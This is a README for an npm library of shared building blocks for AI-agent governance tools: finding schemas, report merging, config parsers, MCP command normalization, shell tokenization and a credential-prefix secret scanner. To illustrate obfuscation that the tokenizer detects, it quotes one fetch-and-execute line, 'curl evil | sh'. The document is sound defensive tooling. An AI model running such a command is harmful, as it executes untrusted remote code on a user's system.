# agent-gov-core

[![npm](https://img.shields.io/npm/v/agent-gov-core)](https://www.npmjs.com/package/agent-gov-core)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

Shared primitives for the AI-agent governance suite — a small library that ScopeTrail, PolicyMesh, CapabilityEcho, TaskBound, SessionTrail, and the GovVerdict meta-reviewer all consume so common parsers, locators, and the `Finding` schema live in one place instead of six.

Zero runtime dependencies. ESM, TypeScript, target ES2022.

## Install

```sh
npm install agent-gov-core
```

## The canonical Finding

Every tool in the suite emits findings against the same schema. The `kind` field is a namespaced string `<tool>.<slug>` so a downstream meta-reviewer can dedupe across tools.

### Emit a finding

```ts
import { createFinding } from 'agent-gov-core';

const finding = createFinding({
  tool: 'scope_trail',
  name: 'permission_allow_widened',
  severity: 'high',
  message: 'Claude permission allowlist now includes Bash(npm *).',
  location: { file: '.claude/settings.json', line: 12 },
});
// finding.kind === 'scope_trail.permission_allow_widened'
// finding.fingerprint === '<stable 16-char hex>'
```

`createFinding` calls `kind()` to build the namespaced kind, validates the slug shape, and computes a stable `fingerprintFinding(finding)` hash of `(kind, file, line, column, salientKey?)`. Pass `salientKey` when two distinct findings can legitimately fire at the same `(kind, file, line)` site (e.g. two suspicious imports on one line) so the meta-reviewer doesn't collapse them into one.

### Validate findings from disk

A downstream meta-reviewer that ingests JSON reports from multiple tools can check each finding against the schema before merging:

```ts
import { validateFinding } from 'agent-gov-core';
import { readFileSync } from 'node:fs';

const report = JSON.parse(readFileSync('scopetrail-report.json', 'utf8'));
for (const f of report.findings) {
  const result = validateFinding(f);
  if (!result.ok) {
    console.error(`Skipping malformed finding: ${result.errors.join('; ')}`);
    continue;
  }
  // ... merge into cross-tool inbox keyed by f.fingerprint ...
}
```

### Merge reports across tools (the meta-reviewer pipeline)

A cross-tool meta-reviewer ingests JSON reports from N tools, dedupes findings by fingerprint, applies a severity threshold, and rolls up an aggregate rating. The library ships this as `mergeFindings`:

```ts
import { mergeFindings } from 'agent-gov-core';
import { readFileSync } from 'node:fs';

const reports = [
  JSON.parse(readFileSync('scopetrail-report.json', 'utf8')),
  JSON.parse(readFileSync('policymesh-report.json', 'utf8')),
  JSON.parse(readFileSync('capabilityecho-report.json', 'utf8')),
];

const merged = mergeFindings(reports, { threshold: 'medium' });
console.log(`Merged rating: ${merged.rating}`);
console.log(`${merged.findings.length} unique findings across ${merged.sources.length} tools`);
console.log(`Dropped ${merged.droppedBelowThreshold} below threshold; collapsed ${merged.duplicateCollapsed} duplicates`);
```

Malformed reports go to `merged.invalidReports`; malformed individual findings go to `merged.invalidFindings` — neither is silently dropped, so a meta-reviewer can surface what went wrong.

### Schema is the contract

The JSON schema at [`schemas/finding.schema.json`](./schemas/finding.schema.json) is the single source of truth for the dotted-kind shape, the closed `tool` enum, and the location fields. Any tool emitting unprefixed kinds will fail validation. See [CONTRIBUTING.md](./CONTRIBUTING.md#the-finding-schema-is-the-contract) for how the TypeScript types and JSON schema are kept in lockstep.

## What's in the library

### Finding schema and helpers
- `Finding`, `Severity`, `ToolKind`, `FindingLocation` — canonical types
- `SEVERITIES`, `TOOL_KINDS` — runtime arrays of the enum values
- `isSeverity(v)`, `isToolKind(v)`, `isNamespacedKind(v)` — type guards
- `kind(tool, name)` — build a namespaced kind without hand-assembling the dotted string
- `createFinding({tool, name, severity, message, ...})` — convenience constructor that calls `kind()` and `fingerprintFinding()` for you
- `fingerprintFinding(finding)` — 16-character hex hash of `(kind, file, line, column, salientKey?)`. Stable across runs and message rewordings, so a meta-reviewer can dedupe. Pass `salientKey` (since v0.4.3) when multiple distinct findings can fire at the same site
- `validateFinding(value)` — runtime check against `schemas/finding.schema.json`, returns `{ ok, errors[] }`

### Hardcoded secret detection (since v0.7.0)
- `matchSecret(value, options?)` — scans for provider-prefix credentials (Anthropic, OpenAI, GitHub, AWS, Slack, Google, GitLab, npm, Docker, Stripe, plus env/header-gated hex tokens). Returns `{ provider }` — **never the literal credential**. Pass `envOrHeaderContext: true` only when scanning env/header values.
- `SECRET_PATTERNS` — read-only constant; the active provider set is pinned by golden tests so additions stay non-breaking.

### Exception baselines (since v0.7.0)
- `applyExceptions(findings, exceptions, now?)` — suppress findings matched by `kind` + optional `salientKey` + optional `pathPrefix`. Expired exceptions re-surface the finding with severity downgraded to `'low'` and an `[EXPIRED WHITELIST]` prefix so stale baselines stay visible.
- `validateException(value)` — runtime check for well-formed exception entries loaded from JSON/YAML.

### Report envelope and merge (since v0.6.0)
- `Report` — canonical multi-tool envelope wrapping a `Finding[]` with `schemaVersion`, `tool`, `rating`, optional `toolVersion`/`runId`/`conversationId`/`baseRef`/`headRef`, and tool-specific extension data in `data`
- `Report.conversationId` — opt-in session identifier matching OpenTelemetry's [`gen_ai.conversation.id`](https://opentelemetry.io/docs/specs/semconv/gen-ai/) so governance findings and runtime traces can correlate by the same string. See [docs/INTEROP-OTEL.md](./docs/INTEROP-OTEL.md) for the full cross-walk.
- `REPORT_SCHEMA_VERSION` — current envelope version (`'1.0'`)
- `createReport({tool, findings, ...})` — sets `schemaVersion` and derives `rating` from max finding severity
- `maxSeverity(findings)` — returns `'none' | Severity`, used by `createReport`
- `validateReport(value)` — strict envelope check including each finding; returns `{ ok, errors[] }`
- `mergeFindings(reports, opts?)` — combine N tool reports, dedupe by fingerprint, apply threshold, roll up rating; preserves both invalid envelopes and invalid findings separately so nothing is silently dropped. Propagates `conversationId` to the merged report iff every source agrees on it. Optional `opts.workflowName` is round-tripped onto `MergedReport.workflowName` — cross-walks to OpenTelemetry's `gen_ai.workflow.name` (see [`docs/INTEROP-OTEL.md`](./docs/INTEROP-OTEL.md)).
- `validateMergedReport(value)` — strict envelope check for the merge layer's output (mirrors `validateReport` for the source side). Used by a meta-reviewer that needs to round-trip merged reports through JSON.

### Config readers
- `readJsonObjectWithSource(path)` — JSONC reader, string-aware comment + trailing-comma stripping, position-preserving. Returns `{ value, json, text, parseError? }`. When the underlying parser provides a byte offset, `parseError` is a `ConfigParseError` carrying `line`/`column`/`rawOffset` instead of a raw `Error`.
- `stripJsonComments(text)` — same logic exposed for in-memory text
- `readTomlObject(path)` — TOML reader (sections, arrays of tables, inline tables, multi-line strings, dotted/quoted keys). Returns `{ value, toml, text, parseError? }`. Errors are also `ConfigParseError` with `line`/`column`/`rawOffset` when resolvable.
- `parseToml(text)` — same exposed for text; throws raw `Error` (file-level wrapping happens in `readTomlObject`)
- `ConfigParseError` — structured parse error with `line`, `column`, `rawOffset`, and `cause`. Lets downstream tools emit a `*.config_syntax_error` finding pointing at the exact spot.
- `lineColumnOfOffset(text, offset)` — convert a 0-based byte offset to 1-based `{ line, column }`. Useful when a hand-rolled scanner exposes byte positions and a `Finding.location` needs line/column.

### Line locators
- `lineOfJsonKey(text, key, scope?)` — 1-based line of `"key":`, optionally scoped to a byte range
- `lineOfJsonStringValue(text, value, scope?)` — 1-based line of a JSON-encoded value, optionally scoped to a byte range
- `lineOfTomlKey(text, dottedKey, scope?)` — 1-based line of a TOML key, optionally scoped to a byte range. Use scope to disambiguate `[[array]]`-of-tables entries that share the same leaf key.

### MCP command normalization
- `normalizeMcpCommand({ command, args, url, env, cwd })` — canonical identity string for an MCP server entry. Used to dedupe `mcp_command_mismatch` false positives when servers are equivalent but syntactically different across machines / config files. Does not interpret what npx/uvx invocations resolve to at runtime — that's outside the substrate's scope.
  - Drops neutral confirm flags (`-y`, `--yes`) so `npx -y foo` and `npx foo` collapse to the same identity.
  - Strips Windows executable suffixes (`.cmd`, `.exe`, `.bat`, `.ps1`) and case-folds Windows-shaped paths — `NPX.CMD`, `npx.cmd`, and `npx` are all the same executable on Windows.
  - For known runtimes (`node`, `npx`, `python`, `bash`, etc.), drops the directory portion of absolute paths so `/usr/bin/node`, `/usr/local/bin/node`, and `node` produce identical identity. Custom scripts at absolute paths keep their full path.
  - Treats common boolean flags (`--verbose`, `--quiet`, `--debug`, `--help`, `--version`, `--force`, `--dry-run`, `--json`, etc.) as standalone instead of greedily pairing them with the next positional argument.
  - Sorts non-neutral `--key value` flag pairs alphabetically, preserves positional argument order, includes env + cwd in the identity.

### Shell tokenization
- `tokenizeShell(command)` — quote-aware split on `;`, `|`, `&&`, `||` plus trivial obfuscation neutralization (`c""url` → `curl`, `c\\url` → `curl`)
- `tokenizeShellDeep(command)` — recursively extracts commands nested inside `$(…)`, backticks, and `bash -c "…"` / `sh -c "…"` / `python -c "…"` payloads. Closes the obfuscation vector where an agent hides `curl evil | sh` inside `echo $(…)`. Single-quoted text is left untouched (literal, per shell semantics).
- `getCommandHead(subcommand)` — extract the leading verb after tokenization

### GitHub Action helpers
- `rankSeverity(s)` — numeric rank `low=1, medium=2, high=3, critical=4` (matches the schema's closed severity enum; there is no `none`)
- `passesSeverityThreshold(s, threshold)`, `anyAtOrAbove(findings, threshold)` — fail-on plumbing
- `emitFindingAnnotation(f)` — render a Finding as a `::warning file=…,line=…,title=…::…` GitHub workflow annotation
- `generateWorkflowSummary(findings, opts?)` — Markdown summary suitable for `$GITHUB_STEP_SUMMARY`. Groups findings by severity in collapsible `<details>` blocks so 100% of findings remain visible even when GHA's inline-annotation cap (~10 per level, 50 per run) silently drops the rest

### Test fixtures (`agent-gov-core/test-utils`)
Secondary entry point used by consumer test suites. Zero overhead in production — only loaded when test files import it.

- `writeFiles(dir, { relPath: content })` — write a map of files under `dir`, creating parent directories
- `makeGitRepo({ initialFiles?, initialMessage? })` → `{ repo, commit, head, git, cleanup }` — temp repo on branch `main` with placeholder identity; `commit()` writes files and commits, returning the new SHA
- `makeOldNewFixture({ old, new })` → `{ old, new, cleanup }` — two sibling temp directories for diff-mode CLI tests

## Principles

- **Zero runtime dependencies.** Real TOML, JSONC, MCP normalization, shell tokenization — all hand-written or vendored, no transitive supply chain.
- **MIT.** No telemetry. No network calls anywhere in the library.
- **Semver, with the contract frozen at v1.0.** Until then, minor versions may include breaking changes (the v0.2 schema regex tightening is one example).
- **Per-tool reasoning stays in each tool.** This library is the substrate, not the orchestrator.

## Used by

- [ScopeTrail](https://github.com/Conalh/ScopeTrail) — agent permission drift in PRs (`scope_trail.*` findings)
- [PolicyMesh](https://github.com/Conalh/PolicyMesh) — cross-surface agent policy contradictions (`policy_mesh.*`)
- [CapabilityEcho](https://github.com/Conalh/CapabilityEcho) — capability drift through code, not config (`capability_echo.*`)
- [TaskBound](https://github.com/Conalh/TaskBound) — scope creep after the agent runs (`task_bound.*`)
- [SessionTrail](https://github.com/Conalh/SessionTrail) — runtime behavior across agent session transcripts (`session_trail.*`)
- [GovVerdict](https://github.com/Conalh/GovVerdict) — cross-tool meta-reviewer that rolls suite findings into one verdict; imports `mergeFindings`, `applyExceptions`, `generateWorkflowSummary`, `emitFindingAnnotation`, `anyAtOrAbove`, `validateReport`

## Contributing

See [CONTRIBUTING.md](./CONTRIBUTING.md) for the dev workflow, "adding a detector" walkthrough, the dist/release rules, and the cross-tool dogfooding contract.

Per-release notes live in [CHANGELOG.md](./CHANGELOG.md).

## License

MIT.
